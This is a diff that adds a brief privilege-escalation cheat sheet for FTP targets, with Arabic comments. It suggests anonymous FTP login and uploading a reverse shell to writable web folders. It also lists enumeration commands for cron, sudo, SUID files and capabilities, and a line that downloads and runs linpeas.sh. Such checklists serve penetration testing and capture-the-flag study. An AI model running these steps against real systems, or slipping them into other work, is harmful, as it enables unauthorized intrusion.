@@ -1,0 +1,10 @@
+# FTP PrivEsc (21)
+ftp <target>                             # جرّب anonymous/مستخدم معروف وحدد مسارات قابلة للكتابة
+# ارفع شل عكسي/سكريبت في dir يُنفّذ (إن وُجد)
+find /var/www -writable -type d 2>/dev/null   # مثال: مجلد ويب قابل للكتابة
+# cron أو hooks
+grep -R "cron" /etc/ 2>/dev/null       # ابحث عن مهام تلقائية قد تنفّذ ملفك
+sudo -l                                  # أوامر sudo المتاحة بدون كلمة مرور
+find / -perm -4000 -type f 2>/dev/null   # ملفات SUID
+getcap -r / 2>/dev/null                  # قدرات قابلة للاستغلال
+wget https://.../linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh   # فحص تلقائي شامل
